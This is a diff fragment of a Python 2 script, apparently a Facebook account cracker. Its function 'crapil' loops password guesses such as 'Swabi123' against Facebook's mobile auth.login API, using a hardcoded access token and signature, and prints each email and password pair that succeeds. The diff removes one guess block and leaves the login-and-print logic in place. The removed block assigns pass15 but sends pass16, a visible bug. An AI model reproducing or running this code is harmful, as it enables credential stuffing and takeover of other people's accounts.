@@ -390,17 +390,8 @@ def crapil():
                                                                                 if 'access_token' in u:
                                 	                                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass15
                                                                                 elif 'www.facebook.com' in u['error_msg']:
-                            	                                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass15
-                                                                            	else:
-                                                                            	# Password Guess 16
-                                                                                pass15= 'Swabi123'
-                                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                                                u = json.load(data)
-                                                                                if 'access_token' in u:
-                                	                                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass16
-                                                                                elif 'www.facebook.com' in u['error_msg']:
-                            	                                                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass16
-                            
+                            	                                                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass15
+                                                                            
 														
 		except:
 			pass
